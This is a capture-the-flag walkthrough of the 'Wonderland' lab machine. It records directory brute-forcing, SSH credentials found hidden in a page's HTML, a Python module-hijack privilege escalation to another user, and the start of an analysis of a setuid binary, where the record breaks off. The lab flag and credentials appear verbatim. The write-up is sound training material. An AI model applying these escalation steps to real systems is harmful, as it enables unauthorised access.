# Wonderland

`Target IP - 10.10.105.226`

## nmap
```console
┌──(wixter07㉿krakenbone)-[~/Downloads]
└─$ nmap -sV -sC 10.10.70.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 14:55 EST
Nmap scan report for 10.10.70.234
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.40 seconds
```

So we need to ssh into port 22.

## Analysis

Launched the IP on browser

![Screenshot from 2024-11-06 14-59-01](https://github.com/user-attachments/assets/18c08742-226e-4b70-ae61-cf3d53c7d082)

Aight time to goubster with common.txt

```console
┌──(wixter07㉿krakenbone)-[~/Downloads]
└─$ gobuster dir -u "http://10.10.70.234/" -w common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.70.234/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]
/r                    (Status: 301) [Size: 0] [--> r/]
/render/https://www.google.com (Status: 301) [Size: 0] [--> /render/https:/www.google.com]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```


/r had 
![Screenshot from 2024-11-06 15-07-24](https://github.com/user-attachments/assets/b6a2811e-9a6e-4f39-8c2e-7ab218156252)

Nothing quite intereseting

/img had the juice. Three image files alice_door.jpg, alice_door.png, white_rabbit_1.jpg

White rabbit
![image](https://github.com/user-attachments/assets/d677f86c-d63c-4b2c-9282-b4768ac5d21d)

Wasn't able to access the other two images directly so wget it.

Hmm hmm hmm. Nothing in the image tbh. I'll run gobuster with big.txt lmao.


# Reattempt

Dang so recursive directory bruting it is. Didn't figure out a way to get it to work on ffuf or gobuster but found Dirbuster and configured and my my my, what a beauty.


![image](https://github.com/user-attachments/assets/25eaa1ee-32e9-4b80-ac88-cfea63088f44)


Though the bruting dies after *r/a/b/b/i/" but pretty guessable that its rabbit. And there it is 

![image](https://github.com/user-attachments/assets/37b821a5-47f1-4935-8ead-ff130482650f)

And we are cooking

![image](https://github.com/user-attachments/assets/0995836e-b4d4-44ca-b5a1-27800eda8df9)

On inspecting, we can see where alice_door.png that we weren't able to access is visible.

```html
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```


Pretty sure ```alice:HowDothTheLittleCrocodileImproveHisShiningTail``` are credentials for the ssh. Time to do it

And we are in

![image](https://github.com/user-attachments/assets/e6d8a329-6452-4e84-8fb4-42bd3cad6720)


# Privilege Escalation

Initial analysis

```bash
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ cd ..
alice@wonderland:/home$ ls
alice  hatter  rabbit  tryhackme
alice@wonderland:/home$ cd hatter
-bash: cd: hatter: Permission denied
alice@wonderland:/home$ cd rabbit
-bash: cd: rabbit: Permission denied
```

Now sadly, the ssh on vm dies for some reason so moved to the attackbox. The python file had this 


```py
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright \u2014
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done \u2014
"It\u2019s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head \u2014
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head \u2014
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
Their coats were brushed, their faces washed,
Their shoes were clean and neat \u2014
And this was odd, because, you know,
They hadn\u2019t any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more \u2014
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes \u2014 and ships \u2014 and sealing-wax \u2014
Of cabbages \u2014 and kings \u2014
And why the sea is boiling hot \u2014
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed \u2014
Now if you\u2019re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf \u2014
I\u2019ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we\u2019ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter\u2019s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You\u2019ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none \u2014
And that was scarcely odd, because
They\u2019d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```


Ater a bit of playing around, got the first flag

```bash
alice@wonderland:/$ ls
bin    dev   initrd.img      lib64       mnt   root  srv       tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   swap.img  usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys       var
alice@wonderland:/$ find user.txt
find: \u2018user.txt\u2019: No such file or directory
alice@wonderland:/$ cd root
alice@wonderland:/root$ cat user.txt
thm{"Curiouser and curiouser!"}
alice@wonderland:/root$ 
```

Had a break and conversed on a plan to priv esc from the walrus script. Create a custom random and /bin/bash to rabbit considering I can't write on walrus. User alice can run /usr/bin/python3.6 on wonderland so we do this.

```bash
alice@wonderland:~$ nano random.py 
alice@wonderland:~$ cat random.py 
import os
os.system("/bin/bash")
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
[sudo] password for alice: 
Sorry, try again.
[sudo] password for alice: 
rabbit@wonderland:~$ whoami
rabbit
```
Moving forward 

```bash
rabbit@wonderland:/home/rabbit$ ls
teaParty
rabbit@wonderland:/home/rabbit$ file teaParty 
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 13 Nov 2024 20:59:24 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
```

b64 that binary to local and decompiled with IDA.

![image](https://github.com/user-attachments/assets/5dd24f1a-5bde-4236-bdc7-443a5e732f2f)

```bash
rabbit@wonderland:/home/rabbit$ ltrace ./teaParty 
setuid(1003)                                     = -1
setgid(1003)                                     = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)     = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Wed, 13 Nov 2024 21:10:05 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)      = 69
getchar(1, 0x55726f15f260, 0x7f8d635518c0, 0x7f8d63274154
) = 10
puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
)      = 33
+++ exited (status 33) +++
```

Hmm, custom date? setuid of hatter is 1003 though. Not sure what is up but let's try custom date only.


